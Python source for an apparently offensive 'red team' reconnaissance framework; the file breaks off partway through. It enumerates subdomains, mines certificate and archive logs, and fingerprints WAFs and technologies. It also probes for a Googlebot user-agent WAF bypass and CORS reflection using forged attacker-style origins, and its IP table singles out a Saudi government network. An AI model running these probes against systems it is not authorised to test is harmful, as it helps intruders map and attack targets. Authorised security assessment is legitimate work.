#!/usr/bin/env python3
"""
REDTEAM.PY — Advanced Red Team Reconnaissance Framework
========================================================
20 Integrated Tools | 30 Security Skills | Auto-Chain Execution

Usage:
    python redteam.py --target https://example.com --output ./results
    python redteam.py --target https://example.com --output ./out --workers 10 --rate 2.0 --depth 3
    python redteam.py --target https://example.com --output ./out --phases 1,2,3,4,5
    python redteam.py --target https://example.com --output ./out --scope extra.example.com

Author: Red Team Framework v3.0
"""

import argparse
import asyncio
import base64
import csv
import hashlib
import html
import ipaddress
import json
import math
import os
import re
import socket
import ssl
import sys
import time
import urllib.parse
import zlib
from collections import defaultdict, Counter
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urljoin, urlparse, urlencode, parse_qs

# ─────────────────────────────────────────────
# Try imports — graceful fallback
# ─────────────────────────────────────────────
try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─────────────────────────────────────────────
# ANSI Colors
# ─────────────────────────────────────────────
class C:
    RED    = '\033[0;31m'
    GREEN  = '\033[0;32m'
    YELLOW = '\033[1;33m'
    CYAN   = '\033[0;36m'
    BLUE   = '\033[0;34m'
    PURPLE = '\033[0;35m'
    WHITE  = '\033[1;37m'
    DIM    = '\033[2m'
    BOLD   = '\033[1m'
    NC     = '\033[0m'

def banner(msg: str):   print(f"\n{C.CYAN}[*] {msg}{C.NC}")
def ok(msg: str):       print(f"{C.GREEN}[+] {msg}{C.NC}")
def warn(msg: str):     print(f"{C.YELLOW}[!] {msg}{C.NC}")
def high(msg: str):     print(f"{C.RED}[!!] {msg}{C.NC}")
def info(msg: str):     print(f"{C.DIM}    {msg}{C.NC}")
def skill(msg: str):    print(f"{C.PURPLE}[SKILL] {msg}{C.NC}")

# ─────────────────────────────────────────────
# DATACLASSES
# ─────────────────────────────────────────────
@dataclass
class Finding:
    id: str
    title: str
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    cwe: str
    cvss: float
    description: str
    evidence: str
    reproduction: str
    poc_curl: str
    burp_request: str = ""
    category: str = ""
    remediation: str = ""

@dataclass
class TargetProfile:
    url: str
    apex: str
    host: str
    scheme: str
    ip: str = ""
    asn: str = ""
    provider: str = ""
    tls_version: str = ""
    tls_cipher: str = ""
    cert_cn: str = ""
    cert_sans: List[str] = field(default_factory=list)
    cert_issuer: str = ""
    cert_expires: str = ""
    waf: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    ct_subdomains: List[str] = field(default_factory=list)
    wayback_urls: List[str] = field(default_factory=list)
    js_files: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)
    graphql_endpoints: List[str] = field(default_factory=list)
    sensitive_paths: List[str] = field(default_factory=list)
    s3_buckets: List[str] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)
    security_headers: Dict[str, Any] = field(default_factory=dict)
    cors_results: List[Dict] = field(default_factory=list)
    cookie_results: List[Dict] = field(default_factory=list)
    secrets: List[Dict] = field(default_factory=list)
    open_redirects: List[str] = field(default_factory=list)
    ssrf_params: List[str] = field(default_factory=list)
    parameters: List[str] = field(default_factory=list)
    forms: List[Dict] = field(default_factory=list)

@dataclass
class Config:
    targets: List[str]
    output: str
    workers: int = 10
    rate: float = 2.0
    depth: int = 3
    timeout: int = 20
    scope_extras: List[str] = field(default_factory=list)
    phases: List[int] = field(default_factory=lambda: list(range(1, 11)))
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ua_bot: str = "Googlebot/2.1 (+http://www.google.com/bot.html)"

# ─────────────────────────────────────────────
# TOOL 1: DNS RESOLVER
# ─────────────────────────────────────────────
class DNSResolver:
    """SKILL-01: DNS resolution & multi-record enumeration"""

    ASN_RANGES = [
        ('104.16.0.0/12',  'Cloudflare (AS13335)'),
        ('172.64.0.0/13',  'Cloudflare (AS13335)'),
        ('20.0.0.0/8',     'Microsoft Azure (AS8075)'),
        ('13.0.0.0/8',     'Microsoft Azure (AS8075)'),
        ('52.0.0.0/8',     'Amazon AWS (AS16509)'),
        ('54.0.0.0/8',     'Amazon AWS (AS16509)'),
        ('185.169.0.0/16', 'ZAIN/STC Saudi Arabia'),
        ('164.215.0.0/16', 'Saudi Government Network (MCIT)'),
        ('192.168.0.0/16', 'RFC1918 Private'),
        ('10.0.0.0/8',     'RFC1918 Private'),
    ]

    def resolve(self, hostname: str) -> str:
        try:
            return socket.gethostbyname(hostname)
        except Exception:
            return "NXDOMAIN"

    def resolve_all(self, hostname: str) -> List[str]:
        try:
            info = socket.getaddrinfo(hostname, None)
            return list({r[4][0] for r in info})
        except Exception:
            return []

    def classify_ip(self, ip: str) -> str:
        try:
            addr = ipaddress.ip_address(ip)
            for cidr, name in self.ASN_RANGES:
                if addr in ipaddress.ip_network(cidr, strict=False):
                    return name
        except Exception:
            pass
        return "Unknown"

    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("DNS-01: Resolving target hostname")
        parsed = urlparse(profile.url)
        host = parsed.hostname
        profile.host = host
        profile.scheme = parsed.scheme
        profile.apex = ".".join(host.split(".")[-2:]) if host else host

        ip = self.resolve(host)
        profile.ip = ip
        profile.provider = self.classify_ip(ip)
        ok(f"  {host} → {ip} ({profile.provider})")

        # Common subdomains reachability
        common = ["www", "api", "dev", "staging", "admin", "mail", "ftp",
                  "static", "cdn", "assets", "help", "support", "portal",
                  "auth", "login", "sso", "mobile", "m", "app", "test",
                  "beta", "internal", "vpn", "git", "jenkins", "monitoring"]
        live = []
        for sub in common:
            fqdn = f"{sub}.{profile.apex}"
            r = self.resolve(fqdn)
            if r != "NXDOMAIN":
                live.append(fqdn)
                info(f"  {fqdn} → {r}")
        profile.subdomains = live
        return profile

# ─────────────────────────────────────────────
# TOOL 2: TLS ANALYZER
# ─────────────────────────────────────────────
class TLSAnalyzer:
    """SKILL-02: TLS version, cipher, certificate, SAN extraction"""

    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("TLS-02: Analyzing TLS certificate and cipher suite")
        host = profile.host
        try:
            ctx = ssl._create_unverified_context()
            ctx.check_hostname = False
            with socket.create_connection((host, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as s:
                    profile.tls_version = s.version() or ""
                    profile.tls_cipher = s.cipher()[0] if s.cipher() else ""
                    cert = s.getpeercert()
                    if cert:
                        subj = dict(x[0] for x in cert.get('subject', []))
                        issr = dict(x[0] for x in cert.get('issuer', []))
                        profile.cert_cn = subj.get('commonName', '')
                        profile.cert_issuer = issr.get('organizationName', '')
                        profile.cert_expires = cert.get('notAfter', '')
                        profile.cert_sans = [v for k, v in cert.get('subjectAltName', [])]
                    ok(f"  TLS: {profile.tls_version} / {profile.tls_cipher}")
                    ok(f"  Cert CN: {profile.cert_cn} | Expires: {profile.cert_expires}")
                    ok(f"  SANs: {', '.join(profile.cert_sans[:5])}")
        except Exception as e:
            warn(f"  TLS probe failed: {e}")

        # Check for short cert validity (ACME / Let's Encrypt indicator)
        if profile.cert_expires:
            try:
                from email.utils import parsedate
                import calendar
                exp_tuple = parsedate(profile.cert_expires)
                if exp_tuple:
                    exp_ts = calendar.timegm(exp_tuple)
                    days = (exp_ts - time.time()) / 86400
                    if days < 45:
                        warn(f"  Short-lived cert ({int(days)} days) — ACME/LE rotation")
            except Exception:
                pass

        return profile

# ─────────────────────────────────────────────
# TOOL 3: CT LOG SCANNER
# ─────────────────────────────────────────────
class CTLogScanner:
    """SKILL-03: Certificate Transparency log mining via crt.sh"""

    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("CT-03: Mining Certificate Transparency logs (crt.sh)")
        apex = profile.apex
        try:
            import urllib.request
            url = f"https://crt.sh/?q=%25.{apex}&output=json"
            req = urllib.request.Request(url, headers={"User-Agent": "RedTeam/3.0"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode())
            seen = set()
            for row in data:
                for n in str(row.get('name_value', '')).splitlines():
                    n = n.strip().lstrip('*.').lower()
                    if n and '@' not in n and ' ' not in n and n.endswith(apex):
                        seen.add(n)
            profile.ct_subdomains = sorted(seen)
            ok(f"  Found {len(profile.ct_subdomains)} subdomains in CT logs for {apex}")
            for s in profile.ct_subdomains[:15]:
                info(f"  {s}")
        except Exception as e:
            warn(f"  CT log query failed (run locally): {e}")
        return profile

# ─────────────────────────────────────────────
# TOOL 4: WAYBACK MACHINE MINER
# ─────────────────────────────────────────────
class WaybackMiner:
    """SKILL-04: Wayback Machine CDX API URL mining"""

    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("WAYBACK-04: Mining Wayback Machine for archived URLs")
        apex = profile.apex
        try:
            import urllib.request
            url = (f"https://web.archive.org/cdx/search/cdx"
                   f"?url=*.{apex}/*&output=json&fl=original&collapse=urlkey&limit=3000")
            req = urllib.request.Request(url, headers={"User-Agent": "RedTeam/3.0"})
            with urllib.request.urlopen(req, timeout=20) as resp:
                rows = json.loads(resp.read().decode())
            urls = set()
            for row in (rows[1:] if rows and isinstance(rows[0], list) else rows):
                if isinstance(row, list) and row:
                    urls.add(row[0])
                elif isinstance(row, str):
                    urls.add(row)
            profile.wayback_urls = sorted(urls)
            ok(f"  Found {len(profile.wayback_urls)} archived URLs")

            # Extract interesting patterns
            interesting = [u for u in profile.wayback_urls if re.search(
                r'\.(json|xml|csv|bak|sql|php|asp|aspx|env|key|pem)|api/|admin/|config', u, re.I
            )]
            if interesting:
                warn(f"  {len(interesting)} interesting archived URLs found:")
                for u in interesting[:10]:
                    info(f"  {u}")
        except Exception as e:
            warn(f"  Wayback query failed (run locally): {e}")
        return profile

# ─────────────────────────────────────────────
# TOOL 5: WAF DETECTOR
# ─────────────────────────────────────────────
class WAFDetector:
    """SKILL-05: WAF/CDN fingerprinting via headers and response analysis"""

    WAF_HEADERS = {
        "Cloudflare":    ["cf-ray", "cf-cache-status", "cf-request-id"],
        "Akamai":        ["x-akamai-transformed", "x-akamai-request-id", "x-check-cacheable"],
        "AWS CloudFront":["x-amz-cf-id", "x-amz-cf-pop", "via"],
        "Fastly":        ["x-fastly-request-id", "x-served-by", "x-timer"],
        "Varnish":       ["x-varnish", "via"],
        "Incapsula":     ["x-iinfo", "x-cdn"],
        "Sucuri":        ["x-sucuri-id", "x-sucuri-cache"],
        "DataDome":      ["x-datadome-cid"],
        "Reblaze":       ["x-reblaze-protection"],
        "F5 BIG-IP":     ["x-cnection", "x-wa-info"],
        "Imperva":       ["x-iinfo"],
        "Barracuda":     ["barra_counter_session"],
        "ModSecurity":   ["mod_security"],
        "Nginx":         ["server"],
    }

    WAF_STATUS_CODES = {403: "Blocked", 406: "Not Acceptable", 412: "Precondition Failed",
                        429: "Rate Limited", 503: "Service Unavailable"}

    def _fetch_headers(self, url: str, ua: str, timeout: int) -> Tuple[Dict, int]:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": ua,
                "Accept": "text/html,*/*", "Accept-Language": "ar,en-US;q=0.7,en;q=0.3"})
            with urllib.request.urlopen(req, timeout=timeout,
                                        context=ssl._create_unverified_context()) as r:
                headers = dict(r.headers)
                return {k.lower(): v for k, v in headers.items()}, r.status
        except urllib.error.HTTPError as e:
            return {k.lower(): v for k, v in e.headers.items()}, e.code
        except Exception:
            return {}, 0

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WAF-05: Fingerprinting WAF/CDN layer")
        headers, status = self._fetch_headers(profile.url, cfg.user_agent, cfg.timeout)
        detected = []

        server = headers.get("server", "")
        if server:
            info(f"  Server: {server}")

        for waf_name, h_list in self.WAF_HEADERS.items():
            for h in h_list:
                if h in headers:
                    val = headers[h]
                    # Skip generic "via" unless it has CDN content
                    if h == "via" and "cloudfront" not in val.lower() and "varnish" not in val.lower():
                        continue
                    if waf_name not in detected:
                        detected.append(waf_name)
                        ok(f"  WAF/CDN detected: {waf_name} (via {h}: {val[:60]})")

        # Googlebot bypass test
        _, bot_status = self._fetch_headers(profile.url, cfg.ua_bot, cfg.timeout)
        if status != 0 and bot_status == 200 and status != 200:
            high(f"  WAF BYPASS: Googlebot UA returns 200 vs browser {status}!")
            detected.append("BYPASS:Googlebot")
            profile.findings.append(Finding(
                id=f"F-WAF-{profile.host[:8]}-001",
                title="WAF Bypass via Googlebot User-Agent",
                severity="MEDIUM",
                cwe="CWE-693",
                cvss=5.3,
                description="The WAF can be bypassed by sending a Googlebot user-agent, returning HTTP 200 instead of the blocked status.",
                evidence=f"Browser UA: HTTP {status} | Googlebot UA: HTTP {bot_status}",
                reproduction="curl -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' " + profile.url,
                poc_curl=f"curl -sk -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' '{profile.url}'",
                category="WAF Bypass",
                remediation="Configure WAF rules to validate all user agents including bot strings."
            ))

        profile.waf = detected
        if not detected:
            info("  No WAF/CDN signatures detected")
        return profile

# ─────────────────────────────────────────────
# TOOL 6: TECHNOLOGY FINGERPRINTER
# ─────────────────────────────────────────────
class TechFingerprinter:
    """SKILL-06: Technology stack detection via headers and body patterns"""

    SIGNATURES = {
        "React":           r"__reactFiber|data-reactroot|react\.development|ReactDOM",
        "Vue.js":          r"__vue__|v-bind:|vue\.runtime|__VUE__",
        "Angular":         r"ng-version|_nghost|angular\.min|ng-app",
        "Next.js":         r"__NEXT_DATA__|/_next/static|next/dist",
        "Nuxt.js":         r"__nuxt|_nuxt/|__NUXT__",
        "WordPress":       r"wp-content|wp-includes|wp-json|/wp-admin",
        "Drupal":          r"Drupal\.settings|drupal\.js|/sites/default/files",
        "Joomla":          r"joomla|option=com_|/media/jui/",
        "SharePoint":      r"_layouts/|_vti_bin|SharePoint|MSOWebPartPage",
        "jQuery":          r"jquery\.min\.js|jQuery\.fn|jquery-\d+\.\d+",
        "Bootstrap":       r"bootstrap\.min\.css|bootstrap\.bundle|navbar-brand",
        "PHP":             r"\.php\b|PHPSESSID|X-Powered-By: PHP",
        "ASP.NET":         r"__VIEWSTATE|asp\.net|\.aspx\b|X-AspNet-Version",
        "Zendesk":         r"zendesk\.com|zdassets\.com|zopim|zdcdn\.com",
        "Freshdesk":       r"freshdesk\.com|freshwidget|d3k81ch9hvuctq\.cloudfront",
        "Salesforce":      r"salesforce\.com|force\.com|\.lightning\.",
        "Google Analytics":r"google-analytics\.com|gtag\(|GA_MEASUREMENT_ID",
        "Google Tag Mgr":  r"googletagmanager\.com|GTM-[A-Z0-9]+",
        "CloudFront":      r"cloudfront\.net|x-amz-cf",
        "Amazon S3":       r"s3\.amazonaws\.com|s3-[a-z]+-[0-9]+\.amazonaws",
        "Cloudflare":      r"cloudflare|__cfduid|cf-cache-status",
        "Fastly":          r"fastly\.com|fastly-io",
        "Nginx":           r"nginx/|Server: nginx",
        "Apache":          r"Apache/|Server: Apache",
        "IIS":             r"Microsoft-IIS|X-Powered-By: ASP",
        "Node.js":         r"X-Powered-By: Express|node\.js|\.node\b",
        "Django":          r"csrfmiddlewaretoken|django|__admin/",
        "Laravel":         r"laravel_session|XSRF-TOKEN|laravel",
        "Spring":          r"JSESSIONID|spring|\.do\b",
        "Ruby on Rails":   r"_session_id|ruby|rails|\.erb\b",
    }

    def _fetch(self, url: str, ua: str, timeout: int) -> Tuple[str, str]:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,*/*",
                "Accept-Language": "ar,en-US;q=0.7,en;q=0.3"
            })
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(500000).decode('utf-8', errors='replace')
                headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
                return body, headers
        except Exception:
            return "", ""

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TECH-06: Fingerprinting technology stack")
        body, headers_str = self._fetch(profile.url, cfg.user_agent, cfg.timeout)
        combined = body + "\n" + headers_str
        detected = []
        for tech, pattern in self.SIGNATURES.items():
            if re.search(pattern, combined, re.I):
                detected.append(tech)
                ok(f"  Technology: {tech}")
        profile.technologies = detected

        # Powered-by header
        for line in headers_str.splitlines():
            if re.search(r'x-powered-by|x-generator|x-aspnet|x-drupal', line, re.I):
                ok(f"  Header: {line.strip()}")

        return profile

# ─────────────────────────────────────────────
# TOOL 7: SECURITY HEADER AUDITOR
# ─────────────────────────────────────────────
class SecurityHeaderAuditor:
    """SKILL-07: HTTP security header audit with scoring"""

    HEADERS = {
        "strict-transport-security": {
            "weight": 20, "check": lambda v: "max-age" in v.lower(),
            "good": "max-age=31536000; includeSubDomains; preload",
            "desc": "HSTS missing — HTTP downgrade risk"
        },
        "content-security-policy": {
            "weight": 20, "check": lambda v: bool(v),
            "good": "default-src 'self'; script-src 'self'; object-src 'none'",
            "desc": "CSP missing — XSS amplification risk"
        },
        "x-content-type-options": {
            "weight": 10, "check": lambda v: "nosniff" in v.lower(),
            "good": "nosniff",
            "desc": "X-Content-Type-Options missing — MIME sniffing risk"
        },
        "x-frame-options": {
            "weight": 10, "check": lambda v: v.upper() in ["DENY", "SAMEORIGIN"],
            "good": "DENY",
            "desc": "X-Frame-Options missing — clickjacking risk"
        },
        "referrer-policy": {
            "weight": 5, "check": lambda v: bool(v),
            "good": "strict-origin-when-cross-origin",
            "desc": "Referrer-Policy missing — data leakage risk"
        },
        "permissions-policy": {
            "weight": 5, "check": lambda v: bool(v),
            "good": "geolocation=(), microphone=(), camera=()",
            "desc": "Permissions-Policy missing"
        },
        "x-xss-protection": {
            "weight": 5, "check": lambda v: "1" in v,
            "good": "1; mode=block",
            "desc": "X-XSS-Protection missing (legacy but useful)"
        },
        "cache-control": {
            "weight": 5, "check": lambda v: "no-store" in v.lower() or "private" in v.lower(),
            "good": "no-store, no-cache",
            "desc": "Cache-Control not configured for privacy"
        },
        "cross-origin-opener-policy": {
            "weight": 10, "check": lambda v: bool(v),
            "good": "same-origin",
            "desc": "COOP missing — cross-origin attack surface"
        },
        "cross-origin-resource-policy": {
            "weight": 10, "check": lambda v: bool(v),
            "good": "same-origin",
            "desc": "CORP missing"
        },
    }

    def _get_response_headers(self, url: str, ua: str, timeout: int) -> Dict[str, str]:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": ua})
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return {k.lower(): v for k, v in r.headers.items()}
        except urllib.error.HTTPError as e:
            return {k.lower(): v for k, v in e.headers.items()}
        except Exception:
            return {}

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HEADERS-07: Auditing HTTP security headers")
        headers = self._get_response_headers(profile.url, cfg.user_agent, cfg.timeout)
        score = 0
        results = {}

        for h_name, meta in self.HEADERS.items():
            val = headers.get(h_name, "")
            present = bool(val)
            correct = meta["check"](val) if present else False
            if correct:
                score += meta["weight"]
                status = "PASS"
            elif present:
                score += meta["weight"] // 2
                status = "WEAK"
            else:
                status = "MISSING"
            results[h_name] = {"status": status, "value": val, "recommended": meta["good"]}
            color = C.GREEN if status == "PASS" else (C.YELLOW if status == "WEAK" else C.RED)
            print(f"  {color}[{status:7s}]{C.NC} {h_name}: {val[:60] or '(not set)'}")

        profile.security_headers = {"score": score, "max": 100, "headers": results}
        ok(f"  Security header score: {score}/100")

        if score < 40:
            profile.findings.append(Finding(
                id=f"F-HDR-{profile.host[:8]}-001",
                title="Missing Critical Security Headers",
                severity="MEDIUM" if score >= 20 else "HIGH",
                cwe="CWE-693",
                cvss=5.4,
                description=f"Security header score is {score}/100. Multiple critical headers are absent.",
                evidence=json.dumps({k: v["status"] for k, v in results.items()}, indent=2),
                reproduction=f"curl -sI '{profile.url}' | grep -iE 'hsts|csp|x-frame|x-content'",
                poc_curl=f"curl -sI '{profile.url}'",
                category="Security Headers",
                remediation="Implement HSTS, CSP, X-Frame-Options, X-Content-Type-Options."
            ))

        return profile

# ─────────────────────────────────────────────
# TOOL 8: CSP ANALYZER
# ─────────────────────────────────────────────
class CSPAnalyzer:
    """SKILL-08: Content Security Policy weakness detection"""

    WEAKNESSES = {
        "unsafe-inline script":  (r"script-src[^;]*'unsafe-inline'", "HIGH",
                                  "Allows inline script execution — XSS risk"),
        "unsafe-eval script":    (r"script-src[^;]*'unsafe-eval'", "HIGH",
                                  "Allows eval() — XSS risk"),
        "wildcard (*) src":      (r"script-src\s+\*|default-src\s+\*", "HIGH",
                                  "Wildcard source allows any origin"),
        "data: in script-src":   (r"script-src[^;]*data:", "MEDIUM",
                                  "data: URIs in script-src enable injection"),
        "http: in script-src":   (r"script-src[^;]*http:", "MEDIUM",
                                  "Plain HTTP source in CSP — downgrade"),
        "missing default-src":   (r"(?!.*default-src)^(?!$)", "MEDIUM",
                                  "No default-src fallback"),
        "object-src missing":    (r"(?!.*object-src)^(?!$)", "MEDIUM",
                                  "Missing object-src — Flash/plugin injection"),
        "report-uri only":       (r"report-uri\s+(?!report-to)", "LOW",
                                  "Deprecated report-uri without report-to"),
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CSP-08: Analyzing Content Security Policy")
        csp = profile.security_headers.get("headers", {}).get("content-security-policy", {}).get("value", "")
        if not csp:
            warn("  No CSP header found — using header audit result")
            return profile

        issues = []
        for name, (pattern, sev, desc) in self.WEAKNESSES.items():
            if re.search(pattern, csp, re.I | re.S):
                issues.append({"name": name, "severity": sev, "desc": desc})
                color = C.RED if sev == "HIGH" else C.YELLOW
                print(f"  {color}[CSP-{sev}]{C.NC} {name}: {desc}")

        if issues:
            high_issues = [i for i in issues if i["severity"] == "HIGH"]
            if high_issues:
                profile.findings.append(Finding(
                    id=f"F-CSP-{profile.host[:8]}-001",
                    title="CSP Policy Weaknesses Detected",
                    severity="HIGH",
                    cwe="CWE-79",
                    cvss=6.1,
                    description=f"CSP contains {len(issues)} weaknesses that weaken XSS protection.",
                    evidence=f"CSP: {csp[:200]}\nIssues: {[i['name'] for i in issues]}",
                    reproduction=f"curl -sI '{profile.url}' | grep -i content-security-policy",
                    poc_curl=f"curl -sI '{profile.url}'",
                    category="CSP",
                    remediation="Remove unsafe-inline, unsafe-eval, and wildcard sources from CSP."
                ))
        return profile

# ─────────────────────────────────────────────
# TOOL 9: CORS ANALYZER
# ─────────────────────────────────────────────
class CORSAnalyzer:
    """SKILL-09: CORS misconfiguration testing with 6 bypass patterns"""

    BYPASS_ORIGINS = [
        ("REFLECTED", "{host}"),
        ("NULL_ORIGIN", "null"),
        ("APEX_PREFIX", "evil.{apex}"),
        ("APEX_SUFFIX", "{apex}.evil.com"),
        ("SUBDOMAIN", "attacker.{apex}"),
        ("PROTO_CHANGE", "http://{host}"),
    ]

    def _test_cors(self, url: str, origin: str, ua: str, timeout: int) -> Dict:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={
                "User-Agent": ua,
                "Origin": origin,
                "Access-Control-Request-Method": "GET",
            })
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                hdrs = {k.lower(): v for k, v in r.headers.items()}
                return {
                    "origin_sent": origin,
                    "acao": hdrs.get("access-control-allow-origin", ""),
                    "acac": hdrs.get("access-control-allow-credentials", ""),
                    "acam": hdrs.get("access-control-allow-methods", ""),
                    "status": r.status,
                }
        except urllib.error.HTTPError as e:
            hdrs = {k.lower(): v for k, v in e.headers.items()}
            return {
                "origin_sent": origin,
                "acao": hdrs.get("access-control-allow-origin", ""),
                "acac": hdrs.get("access-control-allow-credentials", ""),
                "acam": hdrs.get("access-control-allow-methods", ""),
                "status": e.code,
            }
        except Exception:
            return {"origin_sent": origin, "acao": "", "acac": "", "acam": "", "status": 0}

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CORS-09: Testing CORS misconfiguration patterns")
        host = profile.host
        apex = profile.apex
        vulnerabilities = []

        for label, origin_tpl in self.BYPASS_ORIGINS:
            origin = origin_tpl.replace("{host}", host).replace("{apex}", apex)
            result = self._test_cors(profile.url, origin, cfg.user_agent, cfg.timeout)
            result["label"] = label
            profile.cors_results.append(result)

            acao = result.get("acao", "")
            acac = result.get("acac", "").lower()

            if acao and (acao == origin or acao == "*"):
                vuln_level = "HIGH" if acac == "true" else "MEDIUM"
                if acao == "*" and acac == "true":
                    vuln_level = "CRITICAL"
                high(f"  CORS VULNERABLE [{label}]: Origin '{origin}' → ACAO: {acao}, ACAC: {acac}")
                vulnerabilities.append({"origin": origin, "label": label,
                                        "acao": acao, "acac": acac, "level": vuln_level})
            else:
                info(f"  [{label}]: No CORS reflection for '{origin}'")

        if vulnerabilities:
            worst = max(vulnerabilities, key=lambda x: {"CRITICAL":4,"HIGH":3,"MEDIUM":2,"LOW":1}.get(x["level"],0))
            profile.findings.append(Finding(
                id=f"F-CORS-{profile.host[:8]}-001",
                title="CORS Misconfiguration — Cross-Origin Credential Theft",
                severity=worst["level"],
                cwe="CWE-942",
                cvss=8.1 if worst["level"] == "CRITICAL" else 6.5,
                description=f"CORS reflects attacker-controlled origins. {len(vulnerabilities)} bypass patterns work.",
                evidence="\n".join(f"{v['label']}: {v['acao']} (creds={v['acac']})" for v in vulnerabilities),
                reproduction=(
                    f"curl -H 'Origin: {worst['origin']}' -I '{profile.url}' | "
                    "grep -i 'access-control'"
                ),
                poc_curl=(
                    f"curl -sk -H 'Origin: {worst['origin']}' -I '{profile.url}'"
                ),
                burp_request=(
                    f"GET / HTTP/1.1\nHost: {host}\nOrigin: {worst['origin']}\n"
                    "Accept: */*\nConnection: close\n"
                ),
                category="CORS",
                remediation="Implement an explicit origin allowlist. Never reflect the Origin header directly."
            ))

        return profile

# ─────────────────────────────────────────────
# TOOL 10: COOKIE AUDITOR
# ─────────────────────────────────────────────
class CookieAuditor:
    """SKILL-10: Cookie security attribute analysis"""

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("COOKIE-10: Auditing cookie security attributes")
        try:
            import urllib.request, http.cookiejar
            cj = http.cookiejar.CookieJar()
            handler = urllib.request.HTTPCookieProcessor(cj)
            opener = urllib.request.build_opener(handler)
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(profile.url, headers={"User-Agent": cfg.user_agent})
            try:
                opener.open(req, timeout=cfg.timeout)
            except Exception:
                pass

            issues = []
            for cookie in cj:
                c_issues = []
                if not cookie.secure:
                    c_issues.append("missing Secure flag")
                if not cookie.has_nonstandard_attr("HttpOnly"):
                    c_issues.append("missing HttpOnly flag")
                if not cookie.has_nonstandard_attr("SameSite"):
                    c_issues.append("missing SameSite attribute")
                if not cookie.name.startswith("__Host-") and not cookie.name.startswith("__Secure-"):
                    c_issues.append("not using __Host- or __Secure- prefix")

                profile.cookie_results.append({
                    "name": cookie.name,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "secure": cookie.secure,
                    "issues": c_issues,
                })

                if c_issues:
                    warn(f"  Cookie '{cookie.name}': {', '.join(c_issues)}")
                    issues.append(cookie.name)
                else:
                    ok(f"  Cookie '{cookie.name}': secure configuration")

            if issues:
                profile.findings.append(Finding(
                    id=f"F-CK-{profile.host[:8]}-001",
                    title="Insecure Cookie Configuration",
                    severity="MEDIUM",
                    cwe="CWE-1004",
                    cvss=4.7,
                    description=f"Cookies '{', '.join(issues)}' lack security attributes.",
                    evidence=f"Cookies missing flags: {issues}",
                    reproduction=f"curl -sc /dev/null -I '{profile.url}' | grep -i set-cookie",
                    poc_curl=f"curl -sc /dev/null -I '{profile.url}'",
                    category="Cookie Security",
                    remediation="Set Secure, HttpOnly, SameSite=Strict on all session cookies."
                ))
        except Exception as e:
            warn(f"  Cookie audit failed: {e}")
        return profile

# ─────────────────────────────────────────────
# TOOL 11: JS EXTRACTOR
# ─────────────────────────────────────────────
class JSExtractor:
    """SKILL-11: JavaScript file discovery and endpoint extraction"""

    JS_ENDPOINT_PATTERNS = [
        r'(?:fetch|axios\.get|axios\.post|http\.get|http\.post)\s*\(\s*["\']([^"\']+)["\']',
        r'(?:url|endpoint|api_url|baseURL|API_URL)\s*[=:]\s*["\']([^"\']+)["\']',
        r'(?:\/api\/|\/v\d+\/|\/rest\/)[^\s"\'<>]+',
        r'["\']\/[a-zA-Z0-9_\-\/]+(?:\/[a-zA-Z0-9_\-]+)*["\']',
        r'XMLHttpRequest.*?open\s*\(\s*["\'][A-Z]+["\'],\s*["\']([^"\']+)["\']',
    ]

    API_PARAM_PATTERNS = [
        r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=',
        r'"([a-zA-Z_][a-zA-Z0-9_]*)"\s*:',
    ]

    def _fetch_text(self, url: str, ua: str, timeout: int) -> str:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": ua})
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.read(2_000_000).decode('utf-8', errors='replace')
        except Exception:
            return ""

    def _extract_js_urls(self, html_body: str, base_url: str) -> List[str]:
        js_refs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html_body, re.I)
        absolute = []
        for ref in js_refs:
            if ref.startswith("http"):
                absolute.append(ref)
            elif ref.startswith("//"):
                absolute.append("https:" + ref)
            elif ref.startswith("/"):
                parsed = urlparse(base_url)
                absolute.append(f"{parsed.scheme}://{parsed.netloc}{ref}")
            else:
                absolute.append(urljoin(base_url, ref))
        return list(set(absolute))[:30]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
